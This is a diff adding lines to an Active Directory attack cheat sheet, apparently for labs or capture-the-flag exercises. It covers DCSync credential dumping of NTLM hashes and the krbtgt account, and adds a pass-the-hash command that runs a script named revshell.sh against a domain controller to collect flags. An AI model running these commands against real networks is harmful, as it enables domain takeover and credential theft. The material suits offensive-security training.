@@ -122,3 +122,7 @@ Forest trusts → SQL / ADCS / foreign group.
 ## 16 DCSync + EA
 `secretsdump -just-dc-ntlm` / `krbtgt`. Golden only in the lab. Stop when every
 in-scope domain’s KRBTGT is dumped and you can act in the forest root.
+
+CTF flag on top of takeover? One sweep, not a dozen `atexec` calls:
+`revshell.sh flags {{DC}} -u Administrator -H {{HASH}} -d {{DOMAIN}}` (`revshell.md`).
+The takeover proof is still DCSync, not the flag.
